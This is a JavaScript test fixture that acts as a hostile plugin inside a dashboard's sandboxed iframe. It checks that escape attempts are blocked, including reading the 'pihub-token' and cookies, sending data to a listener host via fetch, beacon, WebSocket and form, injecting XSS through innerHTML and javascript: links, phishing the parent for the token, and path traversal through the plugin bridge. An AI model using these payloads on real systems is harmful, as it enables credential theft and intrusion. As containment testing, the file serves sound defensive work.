// Every attempt must end in "blocked:*".  An attempt that works returns the
// marker "ESCAPED" (or throws nothing) and is reported as ALLOWED.
(function () {
  var out = {}, jobs = [], T = 'http://127.0.0.1:9';
  function attempt(name, fn) {
    try {
      var r = fn();
      if (r && typeof r.then === 'function') {
        // a request that never settles is not an escape either
        r = Promise.race([r, new Promise(function (_, rej) { setTimeout(function () { rej(new Error('timeout')); }, 2500); })]);
        jobs.push(r.then(function (v) { out[name] = 'ALLOWED:' + String(v).slice(0, 80); },
                         function (e) { out[name] = 'blocked:' + (e && e.name || 'error'); }));
      } else if (r === 'ESCAPED' || r === true) { out[name] = 'ALLOWED:' + r; }
      else { out[name] = 'blocked:' + String(r).slice(0, 40); }
    } catch (e) { out[name] = 'blocked:' + (e && e.name || 'error'); }
  }
  ph.call('target').then(function (t) { T = (t && t.url) || T; }, function () {}).then(function () {
  attempt('localStorage', function () { return localStorage.getItem('pihub-token') || localStorage.length; });
  attempt('sessionStorage', function () { sessionStorage.setItem('x', '1'); return 'ESCAPED'; });
  attempt('cookie read', function () { return document.cookie; });
  attempt('cookie write', function () { document.cookie = 'a=b'; return 'ESCAPED'; });
  attempt('indexedDB', function () { return indexedDB.open('x'); });
  attempt('fetch same-origin config', function () { return fetch('/api/config/full', { credentials: 'include' }).then(function (r) { return 'ESCAPED ' + r.status; }); });
  attempt('fetch with a stolen-looking token', function () { return fetch('/api/hosts/status', { headers: { Authorization: 'Bearer x' } }).then(function (r) { return 'ESCAPED ' + r.status; }); });
  attempt('fetch to the listener', function () { return fetch(T + '/fetch', { mode: 'no-cors' }).then(function () { return 'ESCAPED'; }); });
  attempt('fetch to the listener (cors)', function () { return fetch(T + '/fetch-cors').then(function () { return 'ESCAPED'; }); });
  attempt('XMLHttpRequest', function () { return new Promise(function (res, rej) { var x = new XMLHttpRequest(); x.open('GET', T + '/xhr'); x.onload = function () { res('ESCAPED ' + x.status); }; x.onerror = function () { rej(new Error('xhr blocked')); }; x.send(); }); });
  attempt('WebSocket', function () { var w = new WebSocket(T.replace('http', 'ws') + '/ws'); return new Promise(function (res, rej) { w.onopen = function () { res('ESCAPED'); }; w.onerror = function () { rej(new Error('ws blocked')); }; }); });
  attempt('EventSource', function () { var e = new EventSource(T + '/es'); return new Promise(function (res, rej) { e.onopen = function () { res('ESCAPED'); }; e.onerror = function () { rej(new Error('es blocked')); }; }); });
  attempt('worker (listener url)', function () { return new Promise(function (res, rej) { var w = new Worker(T + '/w.js'); w.onmessage = function () { res('ESCAPED'); }; w.onerror = function () { rej(new Error('worker blocked')); }; }); });
  attempt('worker (data url)', function () { return new Promise(function (res, rej) { var w = new Worker('data:text/javascript,postMessage(1)'); w.onmessage = function () { res('ESCAPED'); }; w.onerror = function () { rej(new Error('worker blocked')); }; }); });
  attempt('eval', function () { return eval('1+1') === 2 ? 'ESCAPED' : 'no'; });
  attempt('new Function', function () { return new Function('return 1')() === 1 ? 'ESCAPED' : 'no'; });
  attempt('inline handler via innerHTML', function () { window.__inline = 0; var d = document.createElement('div'); d.innerHTML = '<img src=x onerror="window.__inline=1">'; document.body.appendChild(d); return new Promise(function (res, rej) { setTimeout(function () { window.__inline ? res('ESCAPED') : rej(new Error('handler did not run')); }, 300); }); });
  attempt('listener script', function () { return new Promise(function (res, rej) { var s = document.createElement('script'); s.src = T + '/x.js'; s.onload = function () { res('ESCAPED'); }; s.onerror = function () { rej(new Error('script blocked')); }; document.head.appendChild(s); }); });
  attempt('listener image', function () { return new Promise(function (res, rej) { var i = new Image(); i.onload = function () { res('ESCAPED'); }; i.onerror = function () { rej(new Error('img blocked')); }; i.src = T + '/x.png'; }); });
  attempt('listener stylesheet', function () { return new Promise(function (res, rej) { var l = document.createElement('link'); l.rel = 'stylesheet'; l.href = T + '/x.css'; l.onload = function () { res('ESCAPED'); }; l.onerror = function () { rej(new Error('css blocked')); }; document.head.appendChild(l); }); });
  attempt('listener prefetch', function () { var l = document.createElement('link'); l.rel = 'prefetch'; l.href = T + '/prefetch'; document.head.appendChild(l); return 'fired'; });
  // Fire-and-forget primitives: the in-frame return value proves nothing (a queued
  // beacon returns true, a blocked iframe still fires load).  The test asserts on
  // the LISTENER: it must have received no request at all.
  attempt('sendBeacon (fire and forget)', function () { navigator.sendBeacon(T + '/beacon', '{}'); return 'fired'; });
  attempt('iframe to the listener (fire and forget)', function () { var f = document.createElement('iframe'); f.src = T + '/iframe'; document.body.appendChild(f); return 'fired'; });
  attempt('iframe to the dashboard (fire and forget)', function () { var f = document.createElement('iframe'); f.src = '/'; document.body.appendChild(f); return 'fired'; });
  attempt('form to the listener (fire and forget)', function () { var f = document.createElement('form'); f.method = 'POST'; f.action = T + '/form'; document.body.appendChild(f); f.submit(); return 'fired'; });
  attempt('parent.document', function () { return window.parent.document.title || 'empty'; });
  attempt('parent.localStorage', function () { return window.parent.localStorage.getItem('pihub-token'); });
  attempt('parent.USER', function () { return JSON.stringify(window.parent.USER); });
  attempt('top.location read', function () { return window.top.location.href; });
  attempt('top.location write', function () { window.top.location.href = '/?pwned=1'; return 'no-throw'; });
  attempt('parent.postMessage token phish', function () { window.parent.postMessage({ type: 'token' }, '*'); return 'sent'; });
  attempt('window.open', function () { var w = window.open('/', '_blank'); return w ? 'ESCAPED' : 'null'; });
  attempt('form submit to parent', function () { var f = document.createElement('form'); f.method = 'POST'; f.action = '/api/auth/logout'; f.target = '_top'; document.body.appendChild(f); f.submit(); return 'submitted'; });
  attempt('navigator.clipboard read', function () { return navigator.clipboard.readText(); });
  attempt('geolocation', function () { return new Promise(function (res, rej) { navigator.geolocation.getCurrentPosition(function () { res('ESCAPED'); }, function () { rej(new Error('denied')); }); }); });
  attempt('bridge: path traversal', function () { return ph.call('../config/full'); });
  attempt('bridge: absolute route', function () { return ph.call('/api/config/full'); });
  attempt('bridge: undeclared read', function () { return ph.read('proxmox.containers'); });
  attempt('bridge: config read', function () { return ph.read('config.full'); });
  attempt('bridge: other plugin', function () { return ph.call('../other/x'); });
  }).then(function () {
    return Promise.all(jobs);
  }).then(function () {
    return ph.call('report', { method: 'POST', body: { frame: 'attack', results: out } });
  }).then(function () {
    // Only now the render attempts: the validator refuses several of them, and
    // three refusals stop the frame — after its results have been reported.
  ph.render('hosts.card.badges', 'h-evil', { type: 'badge', text: '<img src=x onerror="window.top.__pwned=1">', tone: 'ok', title: '"><img src=x onerror=1>' });
  ph.render('header.pill', null, { type: 'link', text: 'click', href: 'javascript:window.top.__pwned=1' });
  ph.render('header.pill', null, { type: 'script', text: 'alert(1)' });
  ph.render('header.pill', null, { type: 'badge', text: '<script>window.top.__pwned=1<\/script>' });
  ph.render('settings.card', null, { type: 'text', text: 'not a declared slot' });

    // A frame may navigate ITSELF (no CSP directive stops that).  The result is
    // a 401 page with no bridge and no credentials; the dashboard is unaffected.
    setTimeout(function () { location.href = '/api/config/full'; }, 300);
  }).catch(function () {});
})();
